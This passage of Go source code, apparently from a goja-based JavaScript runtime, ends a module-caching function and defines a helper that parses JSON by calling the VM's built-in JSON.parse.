	l.cache[abs] = final
	return final
}

// parseJSON uses the VM's own JSON.parse for fidelity.
func (r *Runtime) parseJSON(s string) (goja.Value, error) {
	jsonObj := r.vm.GlobalObject().Get("JSON").ToObject(r.vm)
	parse, ok := goja.AssertFunction(jsonObj.Get("parse"))
	if !ok {
		return nil, fmt.Errorf("JSON.parse unavailable")
	}
	return parse(goja.Undefined(), r.vm.ToValue(s))
}
